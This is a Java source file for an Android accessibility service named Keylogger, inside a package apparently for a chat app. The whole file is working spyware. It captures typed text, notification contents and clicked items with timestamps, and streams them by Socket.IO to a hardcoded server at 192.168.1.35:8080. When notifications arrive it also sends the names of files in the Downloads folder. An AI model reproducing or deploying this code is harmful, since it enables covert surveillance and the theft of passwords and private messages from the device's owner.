package com.example.mychat;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.os.Environment;
import android.view.accessibility.AccessibilityEvent;

import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import java.io.File;
import java.net.URISyntaxException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    boolean iniciado = false;
    public static final String IP = "192.168.1.35";
    public static final String PORT = "8080";
    String Nickname;
    private Socket socket;

    String uri = "http://" + IP + ":" + PORT;

   // String uri = "https://nodejs-cloud-tfg.appspot.com/";


    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.UK);
        String fecha = df.format(Calendar.getInstance().getTime());

        if(!iniciado){
            iniciado = true;
            Nickname = Build.MODEL;

            try {
                socket = IO.socket(uri);
            } catch (URISyntaxException e) {
                e.printStackTrace();
            }
            socket.connect();
            socket.emit("join", Nickname);

        }

        switch(accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {

                String data = accessibilityEvent.getText().toString();
                data = fecha + "  *** NUEVO TEXTO INTRODUCIDO: ***  " + data;
                socket.emit("keylogger", Nickname, data);
                break;
            }

            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                String data = accessibilityEvent.getText().toString();
                data = fecha + "  *** NUEVA NOTIFICACION: ***  " + data;
                socket.emit("keylogger", Nickname, data);
                sendDownloadFiles();
                break;
            }

            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = accessibilityEvent.getText().toString();
                data = fecha + "  *** NUEVA APLICACIÓN LANZADA: ***  " + data;
                socket.emit("keylogger", Nickname, data);
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }

    private void sendDownloadFiles(){
        socket.emit("new", Nickname, "Nueva descarga detectada");
        String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath() + "/";
        File directory = new File(path);
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            socket.emit("file", Nickname, files[i].toString());
        }
    }


}